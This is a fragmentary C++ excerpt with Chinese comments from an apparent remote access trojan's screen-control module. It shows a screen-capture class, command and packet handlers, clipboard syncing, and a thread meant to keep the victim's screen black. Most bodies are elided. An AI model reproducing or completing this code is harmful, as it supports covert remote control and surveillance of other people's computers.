...
CSMR::CSMR(privatra*pClient):Cprotm(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;
	m_biBitCount = 8;
	m_pScreenSpy = new CSsy(8);
	m_bIsWorking = true;
...
void CSMR::ResetScreen(int biBitCount)
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	...
	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CSsy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CSsy(8, true);
	else
		m_pScreenSpy = new CSsy(biBitCount);
...
void CSMR::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
 		switch (lpBuffer[0])
...
DWORD WINAPI CSMR::WorkThread(LPVOID lparam)
{
	CSMR*pThis = (CSMR*)lparam;
...
// 创建这个线程主要是为了保持一直黑屏
DWORD WINAPI CSMR::ControlThread(LPVOID lparam)
{
...
void CSMR::ProcessCommand( LPBYTE lpBuffer, UINT nSize )
{
	// 数据包不合法
...
void CSMR::UpdateLocalClipboard( char *buf, int len )
{
